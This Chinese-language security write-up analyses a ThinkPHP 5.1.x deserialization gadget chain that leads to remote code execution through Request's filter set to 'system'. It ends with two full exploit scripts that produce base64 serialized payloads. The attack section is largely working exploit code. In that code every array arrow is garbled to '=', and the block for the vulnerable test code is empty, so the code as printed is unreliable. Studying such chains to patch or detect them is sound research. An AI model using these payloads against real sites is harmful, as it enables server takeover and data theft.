# ThinkPHP5.1.x 反序列化

Author: H3rmesk1t

Data: 2021.08.23

# 补充知识
## PHP反序列化原理
- PHP反序列化就是在读取一段字符串然后将字符串反序列化成php对象

## 在PHP反序列化的过程中会自动执行一些魔术方法
|方法名|调用条件|
|:----:|:----:|
__call|	调用不可访问或不存在的方法时被调用
__callStatic	|调用不可访问或不存在的静态方法时被调用
__clone|	进行对象clone时被调用，用来调整对象的克隆行为
__constuct	|构建对象的时被调用
__debuginfo	|当调用var_dump()打印对象时被调用（当你不想打印所有属性）适用于PHP5.6版本
__destruct	|明确销毁对象或脚本结束时被调用
__get	|读取不可访问或不存在属性时被调用
__invoke|	当以函数方式调用对象时被调用
__isset	|对不可访问或不存在的属性调用isset()或empty()时被调用
__set	|当给不可访问或不存在属性赋值时被调用
__set_state|	当调用var_export()导出类时,此静态方法被调用,用__set_state的返回值做为var_export的返回值
__sleep	|当使用serialize时被调用,当你不需要保存大对象的所有数据时很有用
__toString|	当一个类被转换成字符串时被调用
__unset	|对不可访问或不存在的属性进行unset时被调用
__wakeup|	当使用unserialize时被调用,可用于做些对象的初始化操作

## 反序列化的常见起点
- __wakeup：一定会调用
- __destruct：一定会调用
- __toString：当一个对象被反序列化后又被当做字符串使用

## 反序列化的常见中间跳板
- __toString：当一个对象被当做字符串使用
- __get：读取不可访问或不存在属性时被调用
- __set：当给不可访问或不存在属性赋值时被调用
- __isset：对不可访问或不存在的属性调用 `isset()` 或 `empty()` 时被调用，形如 `$this->$func();`

## 反序列化的常见终点
- __call：调用不可访问或不存在的方法时被调用
- call_user_func：一般php代码执行都会选择这里
- call_user_func_array：一般php代码执行都会选择这里

## Phar反序列化原理以及特征
- phar://伪协议会在多个函数中反序列化其 `metadata` 部分
- 受影响的函数包括不限于如下
```
copy,file_exists,file_get_contents,file_put_contents,file,fileatime,filectime,filegroup,
fileinode,filemtime,fileowner,fileperms,
fopen,is_dir,is_executable,is_file,is_link,is_readable,is_writable,
is_writeable,parse_ini_file,readfile,stat,unlink,exif_thumbnailexif_imagetype,
imageloadfontimagecreatefrom,hash_hmac_filehash_filehash_update_filemd5_filesha1_file,
get_meta_tagsget_headers,getimagesizegetimagesizefromstring,extractTo
```

# 漏洞环境
- 漏洞测试环境：PHP7+ThinkPHP5.1.37
- 漏洞测试代码 application/index/controller/Index.php

```php
```

# 漏洞分析
## 寻找反序列化的起始点
- 全局搜索 `__destruct`，跟进 `thinkphp/library/think/process/pipes/Windows.php`

<img src="https://pic.imgdb.cn/item/611fcede4907e2d39c30308c.png" alt="">

- `__destruct` 调用 `removeFiles` 方法，跟进发现存在 `file_exists` 方法，可以触发 `toString`，并且 `$files` 可控

<img src="https://pic.imgdb.cn/item/611fcfe74907e2d39c32c677.png" alt="">

<img src="https://pic.imgdb.cn/item/611fd06f4907e2d39c34a503.png" alt="">

## 寻找反序列化的中间跳板
- 寻找一个实现了 `__toString` 方法的对象来作为跳板，跟进 `thinkphp/library/think/Collection.php`

<img src="https://pic.imgdb.cn/item/611fd0e54907e2d39c363e35.png" alt="">

<img src="https://pic.imgdb.cn/item/611fd1814907e2d39c3875d3.png" alt="">

- `toArray` 方法中寻找一个满足条件的：`$可控变量 -方法(参数可控)`，这样可以去触发某个类的 `__call` 方法

- 跟进 `thinkphp/library/think/model/concern/Conversion.php`，在 `toArray` 方法中找到一个符合条件的 `$relation->visible($name);`

## 寻找反序列化代码执行点
- 需要寻找一个类满足以下2个条件，全局搜索 `__call`，跟进 `thinkphp/library/think/Request.php`
```a
该类中没有”visible”方法
实现了__call方法
```

<img src="https://pic.imgdb.cn/item/612275f144eaada739f47ddf.png" alt="">

- 这里的 `$hook` 可控，可以设计一个数组 `$hook= {"visable"=>"任意method"}`，但是这里有个 `array_unshift($args, $this);` 会把 `$this` 放到 `$arg` 数组的第一个元素，可以采用如下形式 `call_user_func_array([$obj,"任意方法"],[$this,任意参数]`
- 但这种形式很难执行代码，于是尝试覆盖 `filter` 的方法去执行代码，发现 `input` 方法满足条件

```php
public function input($data = [], $name = '', $default = null, $filter = '')
    {
        if (false === $name) {
            // 获取原始数据
            return $data;
        }

        $name = (string) $name;
        if ('' != $name) {
            // 解析name
            if (strpos($name, '/')) {
                list($name, $type) = explode('/', $name);
            }

            $data = $this->getData($data, $name);

            if (is_null($data)) {
                return $default;
            }

            if (is_object($data)) {
                return $data;
            }
        }

        // 解析过滤器
        $filter = $this->getFilter($filter, $default);

        if (is_array($data)) {
            array_walk_recursive($data, [$this, 'filterValue'], $filter);
            if (version_compare(PHP_VERSION, '7.1.0', '<')) {
                // 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针
                $this->arrayReset($data);
            }
        } else {
            $this->filterValue($data, $name, $filter);
        }

        if (isset($type) && $data !== $default) {
            // 强制类型转换
            $this->typeCast($data, $type);
        }

        return $data;
    }
```
- 但是这个方法不能直接使用，`$name` 是一个数组，由于前面判断条件 `is_array($data)` 会报错终止程序，所以不能直接使用这个函数，继续查找调用 `input` 方法的的函数，跟进 `thinkphp/library/think/Request.php` 中的 `param` 方法，这里如果能满足 `$name` 为字符串，就可以控制变量代码执行

```php
public function param($name = '', $default = null, $filter = '')
    {
        if (!$this->mergeParam) {
            $method = $this->method(true);

            // 自动获取请求变量
            switch ($method) {
                case 'POST':
                    $vars = $this->post(false);
                    break;
                case 'PUT':
                case 'DELETE':
                case 'PATCH':
                    $vars = $this->put(false);
                    break;
                default:
                    $vars = [];
            }

            // 当前请求参数和URL地址中的参数合并
            $this->param = array_merge($this->param, $this->get(false), $vars, $this->route(false));

            $this->mergeParam = true;
        }

        if (true === $name) {
            // 获取包含文件上传信息的数组
            $file = $this->file();
            $data = is_array($file) ? array_merge($this->param, $file) : $this->param;

            return $this->input($data, '', $default, $filter);
        }

        return $this->input($this->param, $name, $default, $filter);
    }
```
- 继续向上查找使用了 `param` 的方法，跟进 `thinkphp/library/think/Request.php` 中的 `isAjax` 或者 方法，发现 `isAjax/isPjax` 方法可以满足 `param` 的第一个参数为字符串，因为 `$this->config` 也是可控的

```php
public function isAjax($ajax = false)
    {
        $value  = $this->server('HTTP_X_REQUESTED_WITH');
        $result = 'xmlhttprequest' == strtolower($value) ? true : false;

        if (true === $ajax) {
            return $result;
        }

        $result           = $this->param($this->config['var_ajax']) ? true : $result;
        $this->mergeParam = false;
        return $result;
    }
```
```php
public function isPjax($pjax = false)
    {
        $result = !is_null($this->server('HTTP_X_PJAX')) ? true : false;

        if (true === $pjax) {
            return $result;
        }

        $result           = $this->param($this->config['var_pjax']) ? true : $result;
        $this->mergeParam = false;
        return $result;
    }
```
## 构造反序列化利用链
- 参考 Mochazz 师傅的示意图

<img src="https://pic.imgdb.cn/item/61227a3a44eaada739f759c1.png" alt="">

- exp-1

```php
<?php
namespace think;
abstract class Model{
    protected $append = [];
    private $data = [];
    function __construct(){
        $this->data = ['H3rmesk1t' =new Request()];
        $this->append = ['H3rmesk1t' =[]];
    }
}
class Request{
    protected $filter;
    protected $hook = [];
    protected $config = [
        // 表单请求类型伪装变量
        'var_method'       ='_method',
        // 表单ajax伪装变量
        'var_ajax'         ='_ajax',
        // 表单pjax伪装变量
        'var_pjax'         ='_pjax',
        // PATHINFO变量名 用于兼容模式
        'var_pathinfo'     ='s',
        // 兼容PATH_INFO获取
        'pathinfo_fetch'   =['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'],
        // 默认全局过滤方法 用逗号分隔多个
        'default_filter'   ='',
        // 域名根，如thinkphp.cn
        'url_domain_root'  ='',
        // HTTPS代理标识
        'https_agent_name' ='',
        // IP代理获取标识
        'http_agent_ip'    ='HTTP_X_REAL_IP',
        // URL伪静态后缀
        'url_html_suffix'  ='html',
    ];
    function __construct(){
        $this->filter = "system";
        $this->config = ['var_ajax' =''];
        $this->hook = ['visible' =[$this,'isAjax']];
    }
}
namespace think\process\pipes;
use think\model\Pivot;

class Windows{
    private $files = [];
    public function __construct(){
        $this->files = [new Pivot()];
    }
}

namespace think\model;
use think\Model;

class Pivot extends Model{
}

use think\process\pipes\Windows;
echo base64_encode(serialize(new Windows()));
?>
```

- exp-2

```php
<?php
namespace think;
abstract class Model{
    protected $append = [];
    private $data = [];
    function __construct(){
        $this->data = ['H3rmesk1t' =new Request()];
        $this->append = ['H3rmesk1t' =[]];
    }
}
class Request{
    protected $filter;
    protected $hook = [];
    protected $config = [
        // 表单请求类型伪装变量
        'var_method'       ='_method',
        // 表单ajax伪装变量
        'var_ajax'         ='_ajax',
        // 表单pjax伪装变量
        'var_pjax'         ='_pjax',
        // PATHINFO变量名 用于兼容模式
        'var_pathinfo'     ='s',
        // 兼容PATH_INFO获取
        'pathinfo_fetch'   =['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'],
        // 默认全局过滤方法 用逗号分隔多个
        'default_filter'   ='',
        // 域名根，如thinkphp.cn
        'url_domain_root'  ='',
        // HTTPS代理标识
        'https_agent_name' ='',
        // IP代理获取标识
        'http_agent_ip'    ='HTTP_X_REAL_IP',
        // URL伪静态后缀
        'url_html_suffix'  ='html',
    ];
    function __construct(){
        $this->filter = "system";
        $this->config = ['var_pjax' =''];
        $this->hook = ['visible' =[$this,'isPjax']];
    }
}
namespace think\process\pipes;
use think\model\Pivot;

class Windows{
    private $files = [];
    public function __construct(){
        $this->files = [new Pivot()];
    }
}

namespace think\model;
use think\Model;

class Pivot extends Model{
}

use think\process\pipes\Windows;
echo base64_encode(serialize(new Windows()));
?>
```

<img src="https://pic.imgdb.cn/item/61227c6e44eaada739f8c422.png" alt="">


## 漏洞利用条件
- 使用的 ThinkPHP 5.1.X 框架的程序中满足以下任意条件:
1. 未经过滤直接使用反序列化操作
2. 可以文件上传且文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤